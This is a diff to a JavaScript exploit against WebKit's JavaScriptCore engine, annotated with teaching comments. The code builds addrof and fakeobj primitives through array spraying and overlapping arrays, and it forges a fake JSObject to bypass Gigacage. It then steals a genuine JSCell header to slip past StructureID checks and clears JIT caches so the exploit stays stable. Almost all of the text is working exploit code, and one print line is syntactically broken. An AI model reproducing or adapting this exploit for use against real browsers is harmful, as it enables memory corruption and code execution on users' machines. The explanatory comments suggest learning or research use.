@@ -481,14 +481,14 @@ for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just bet
         }
 
         //const kSentinel = 1333.337;
-        var kSentinel = qwordAsFloat(0x41414141414141)
+        var kSentinel = qwordAsFloat(0x41414141414141) //magic value to find the right one
         let offset = -1;
-        b1[0] = kSentinel;
+        b1[0] = kSentinel; //set index 0 of b1 to 0x4141
         // scan for the sentinel to find the offset from a to b
         for (var i = 0; i < 0x100; i++) {
-          if (qwordAsTagged(floatAsQword(a1[i])) == kSentinel) {
+          if (qwordAsTagged(floatAsQword(a1[i])) == kSentinel) { //find the a1 array that overlaps b1[0] this will have the 0x4141 value
             port.postMessage("a1[i]" + typeof a1 + hex1(floatAsQword(qwordAsTagged(floatAsQword(a1[i])))))
-            offset = i;
+            offset = i; //note the offset of the a1 array that overlaps b1 :)
             break;
           }
         }
@@ -498,7 +498,9 @@ for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just bet
         }
         //port.postMessage("here")
         // temporary implementations
-        addrof = (val) => {
+	//now that we have an overlapping array one holding floats the other holding JSvalues we have constructed artificial type confusion
+	//between JSValues and Floats so now we can fake an object with our float array and get an an relative read or aka addressof primitive
+        addrof = (val) => { 
           b1[0] = val;
           return floatAsQword(a1[offset]);
         }
@@ -506,9 +508,21 @@ for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just bet
           a1[offset] = qwordAsFloat(addr);
           return b1[0];
         }
-        var victim1 = structure_spray[510];
+	//now that, that is done we can now pick our target for the purpose of crafing an arbitrary r/w primitive using addrof and fakeobj prims
+        var victim1 = structure_spray[510]; //choose an array from our structureID spray earlier it will have an inline property with a double
+	//that way we can simply read values from our inline prop "arbitrary read", and write to inline prop via another overlapping object 
+	//"arbitrary write" ok anyways scratch what I said ever since gigacage mitagation every object that was truly capable of arb r/w
+	//is now caged into a runway zone any access outside of it will crash the process hindering them useless as a target
+	// the targets we are choosing or left with is JSObjects, and JSArrays. JSArrays in the eyes of JSC is another variant of JSObjects
+	//as they can technically do the same thing such as hold inline props and store values and hold structures and structIDs
+	//why aren't JS/Object or Arrays capable of arbitrary r/w well if our inline property can't reach a certain address or it isn't mapped
+	//it'll definitely crash the process so for our r/w to work it has to be capable of reach with our hax and victim1 object...
+	//making our primtives a type of limited arbitrary r/w and if you put it that way its technically not arbitrary...
+	
         // Gigacage bypass: Forge a JSObject which has its butterfly pointing
         // to victim
+	//Since we don't have a gigacage defeat 0 day nor want to waste or find one we can simply bypass it by playing by the rules
+	//and only use what isn't gigacaged which are JSArrays aka JSObjects
         //var boxed1 = [{}];
         var print = (msg) => {
           port.postMessage(msg);
@@ -516,36 +530,78 @@ for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just bet
         //print("unboxed @ " + new Int64(addrof(unboxed1)));
         //print("boxed @ " + new Int64(addrof(boxed1)));
 
-    var container = {
-        header: qwordAsTagged(0x0108230900000000), // cell
-        butterfly: victim1, // butterfly
+    var container = { //here we are simply crafting a contianer to make it seem like a JSObject this will be our "JSCell" since all JSobjects
+	//contain a JSCell to be a container for a header and a butterfly backing
+	//all JSObjects have a header at offset 0 which store a structureID more on that later since we also have to defeat this mitagation
+	//and a butterfly backing 
+        header: qwordAsTagged(0x0108230900000000), //at offset 0 we have our header which tells JSC what type of object it is
+	    //0x0108230700000000 tells JSC its an ArrayWithDoubles and 0x0108230900000000 tells JSC its an ArrayWithContigous
+	    //contigous meaning it holds at least an object or an array with containing multiple values such as doubles,JSValues,Ints etc
+	    //example var a = [13.37] will be ArrayWithDouble 0x0108230700000000
+	    //example var a = [13.37,{}] or [{}] or [1.1,{},0x1234] all count as contigous 0x0108230900000000
+	    //so here we are telling JSC our *Fake Object* is arraywithcotigous
+        butterfly: victim1, // butterfly here we chose our victim or array from our structureID spray from earlier to be our butterfly backing
+	    //for the soul purpose that victim1 has an inline property double value for r/w purposes
     };
+	      //only legit float values can be read/written to
     //var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
     //unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
     //var boxed = [{}];
 
-    print("outer @ " + new Int64(addrof(container)+0x10));
+    print("container @ " + new Int64(addrof(container));
 
-    var hax = fakeobj(addrof(container) + 0x10);
+    var hax = fakeobj(addrof(container) + 0x10); //hax will be our fakeobject which is just the victim1 arraywithdouble as a butterfly
+	//if this works without crashing then we now have fakeobject "hax" that can now do arbitrary r/w
     print("we have hax object ;)");
     print("after further work we can use this object for arbitrary r/w");
     print("now lets steal a real JSCellHeader")
     // Can now simply read a legitimate JSCell header and use it.
-    var js_header = hax[0];
-    container.header = js_header; 
+	//also we are still not good and it prone to crash remember our cell header from earlier telling JSC we are ArrayWithCotigous well 
+	//Webkit team added another mitagation to defeat just simply faking an object and then gaining r/w now it has to be a valid object or else
+	//seem valid to avoid a crash; StructureID as a mitagation add bits to the CellHeader of any object that indicates its gc reference number if 
+	//if its invalid that means the object is corrupted JSC eyes so either we have to A play by the rules and only use a real valid object or B a 
+	//header then craft fake object race to not trigger gc() or JIT and steal a real cell header and make it our own 
+	//Option A is feasible as we can't get arbitrary r/w that way so i guess B it is!
+    //var js_header = hax[0]; not feasible anymore they added another factor to help with StructID mitagation by caching structureID list in 
+    //JIT memory :(
+    //container.header = js_header; 
     //print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
     
     // Can read/write to memory now by corrupting the butterfly
     // pointer of the float array.
     //hax[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
     //victim1[0] = 1337;
+//ok so simply stealing a header and using that isn't going to work as yes it'll pass gc test and wont crash but as soon as we trigger jit, jit will
+	      //look into its cache and see that were fake and invalid and cause a crash
+	      //so we can technically still steal a structureid or cell header but we also need to find a way to essentially clear the JIT Cache
+	      //referencee https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html
+	      /*Running the current exploit would yield memory read/write, but would likely crash soon after 
+	      when the garbage collector runs the next time and scans all reachable heap objects.
+
+The general approach to achieve exploit stability is to keep all heap objects in a functioning state (one that will not cause the GC to crash when it 
+scans the object and visits all outgoing pointers), or, if that is not possible, to repair them as soon as possible after corruption. 
+In the case of this exploit, the fake_arr is initially “GC unsafe” as it contains an invalid StructureID. When its JSCell is later replaced with a 
+valid one (container.jscell_header = jscell_header;) the faked object becomes “GC safe” as it appears like a valid JSArray to the GC.
+
+However, there are some edge cases that can lead to corrupted data being stored in other places of the engine as well. For example, the array load 
+in the previous JavaScript snippet (jscell_header = fake_arr[0];) will be performed by a get_by_val bytecode operation. This operation also keeps 
+a cache of the last seen structure ID, which is used to build the value profiles relied on by the JIT compiler. This is problematic, as the 
+structure ID of the faked JSArray is invalid and will thus lead to crashes, for example when the GC scans the bytecode caches. However, the fix is 
+fortunately fairly easy: execute the same get_by_val op twice, the second time with a valid JSArray, whose StructureID will then be cached instead:
+*/
+	      //so according to projectzer0 we can clear the cache by performing get_by_val jit operation twice
     let results = [];
-    for (let i = 0; i < 2; i++) {
-        let a = i == 0 ? hax : victim1;
-        results.push(a[0]);
+    for (let i = 0; i < 2; i++) { //trigger jit by performing same operation more than once
+        let a = i == 0 ? hax : victim1; //perform logical get_by_val operation twice of 
+	    //essentially in first loop itll grab our hax object because i will equal 0 so itll get hax object
+	    //but the second time it will grab victim1 object essentially clearing the JITCache
+        results.push(a[0]); //push the results to results array
     }
-    jscell_header = results[0];
+    jscell_header = results[0]; //make jscell_header equal that of victim1
     print("Stolen Real Cell Header: " + new Int64.fromDouble(js_header))
+//now we can set container to the real JSCellHeader so we wont ever crash :)
+	      container.header = jscell_header
+	      
       
     var stage2 = {
         addrof: function(obj) {
